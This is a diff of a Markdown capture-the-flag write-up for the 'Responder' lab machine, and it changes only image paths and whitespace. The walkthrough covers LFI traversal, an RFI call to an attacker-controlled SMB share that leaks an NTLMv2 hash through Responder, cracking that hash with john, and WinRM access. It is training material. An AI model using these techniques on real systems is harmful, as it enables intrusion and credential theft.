@@ -37,66 +37,66 @@ Exploit a Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabili
 ## Step-by-Step
 
 **Step 1: Enumeration**
-Running an Nmap scan reveals port 80 (HTTP) and port 5985 (WinRM) are open. 
+Running an Nmap scan reveals port 80 (HTTP) and port 5985 (WinRM) are open.
 
-![Nmap Scan](images/responder.png)
+![Nmap Scan](../images/responder.png)
 
-Attempting to access the IP in a browser redirects us to `unika.htb`. 
+Attempting to access the IP in a browser redirects us to `unika.htb`.
 
-![Browser Redirect](images/responder2.png)
+![Browser Redirect](../images/responder2.png)
 
 We add `unika.htb` to our `/etc/hosts` file to resolve the domain.
 
-![Hosts File](images/responder3.png)
+![Hosts File](../images/responder3.png)
 
 **Step 2: Web Exploitation (LFI/RFI)**
 Navigating the site, we notice it uses a `page` parameter to load different language files (`index.php?page=french.html`).
 
-![Page Parameter](images/responder4.png)
+![Page Parameter](../images/responder4.png)
 
 We test for Local File Inclusion (LFI) by traversing directories to read the Windows `hosts` file (`../../../../../../../../windows/system32/drivers/etc/hosts`). The file contents are successfully displayed, confirming LFI.
 
-![LFI Attempt](images/responder5.png)
+![LFI Attempt](../images/responder5.png)
 
 Next, we test for Remote File Inclusion (RFI) by pointing the `page` parameter to an SMB share on our attacking IP (`//10.10.14.214/anojay`).
 
-![RFI Attempt](images/responder6.png)
+![RFI Attempt](../images/responder6.png)
 
 **Step 3: Hash Capture with Responder**
 To exploit the RFI, we set up `responder` on our `tun0` interface to listen for incoming SMB authentication requests.
 
-![Responder Setup](images/responder7.png)
+![Responder Setup](../images/responder7.png)
 
 When the target attempts to load the file from our fake SMB share, `responder` captures the NTLMv2-SSP hash for the `Administrator` user.
 
-![NTLM Hash Captured](images/responder8.png)
+![NTLM Hash Captured](../images/responder8.png)
 
 **Step 4: Password Cracking**
 We copy the captured hash into a file named `hash.txt`.
 
-![Save Hash](images/responder9.png)
+![Save Hash](../images/responder9.png)
 
 Using `john` with the `rockyou.txt` wordlist, we crack the hash and discover the password is `badminton`.
 
-![John The Ripper](images/responder10.png)
+![John The Ripper](../images/responder10.png)
 
 **Step 5: Remote Access (WinRM)**
 With the Administrator credentials (`Administrator:badminton`) and WinRM running on port 5985, we establish a remote shell using `evil-winrm`.
 
-![Evil-WinRM Connection](images/responder11.png)
+![Evil-WinRM Connection](../images/responder11.png)
 
 We navigate to the `C:\Users` directory to see the available user profiles, identifying `mike`.
 
-![Directory Listing](images/responder12.png)
+![Directory Listing](../images/responder12.png)
 
 **Step 6: Flag Capture**
 We change directories to `mike`'s Desktop and find the `flag.txt` file.
 
-![Desktop Listing](images/responder13.png)
+![Desktop Listing](../images/responder13.png)
 
 Using the `type` command, we read the contents of the flag file.
 
-![Flag Retrieved](images/responder14.png)
+![Flag Retrieved](../images/responder14.png)
 
 ## Key Learning
 Unvalidated parameters in PHP (`include()`) can lead to Local and Remote File Inclusion vulnerabilities. Attackers can leverage RFI on Windows environments to force the server to authenticate to a rogue SMB server, leaking NTLMv2 hashes. If weak passwords are used, these hashes can be easily cracked, leading to complete system compromise via remote management services like WinRM.
